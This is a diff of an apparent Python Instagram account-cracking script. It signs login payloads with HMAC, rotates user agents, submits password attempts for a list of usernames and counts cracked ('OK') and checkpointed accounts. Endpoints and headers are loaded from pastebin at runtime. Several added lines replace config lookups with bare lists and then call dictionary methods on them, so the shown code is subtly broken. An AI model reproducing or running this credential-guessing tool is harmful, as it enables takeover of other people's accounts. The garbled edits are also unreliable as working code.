@@ -931,17 +931,17 @@ class instagram:
 		uaku=self.ua_sendiri()
 		uas=self.ua_ran()
 		ua=f'{giu[0]} {aa}.0.0.{bb}.{cc} {giu[1]} {ven1}; {ven2}; {giu[2]}'
-		dat=HARIS["sinkz"]
+		dat=["sinkz"]
 		dat.update({"id": guid})
 		data1=json.dumps(dat)
 		ned=hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
-		data2=HARIS["sinkz2"]
+		data2=["sinkz2"]
 		data2.update({'signed_body': f'{ned}.{str(data1)}'})
-		head=HARIS["headaing1"]
+		head=["headaing1"]
 		head.update({"user-agent": uas})
 		while True:
 				try:
-					p=ses.post(HARIS["sinkz1"],headers=head,data=data2)
+					p=ses.post(["sinkz1"],headers=head,data=data2)
 					break
 				except:pass
 		prog.update(des,description=f"[white]({acakrich}✔[white]) STABIL [{acakrich}{user}[/]] {str(loop)}/{len(internal)} [green]OK : -{len(success)}[/] [yellow]CP : -{len(checkpoint)}[/]")
@@ -950,7 +950,7 @@ class instagram:
 				try:
 					data=json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw,"login_attempt_count": str(logtemp)})
 					ned=hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
-					head2=HARIS["headaing"]
+					head2=["headaing"]
 					head2.update({"user-agent": uas})
 					sianjing=HARIS["sianjing"]
 					setan=sianjing.split("||")
@@ -1647,7 +1647,7 @@ if __name__=='__main__':
 	except:pass
 	try:
 		with requests.Session() as ses:
-	         ko = ses.get('https://pastebin.com/raw/YUeh4TXw').json()
+	         ko = ses.get('https://pastebin.com/raw/8V2QTWh5').json()
 	         HARIS.update(ko)
 	         ki = ses.get('https://pastebin.com/raw/HgttQbWx').json()
 	         HARIS1.update(ki)
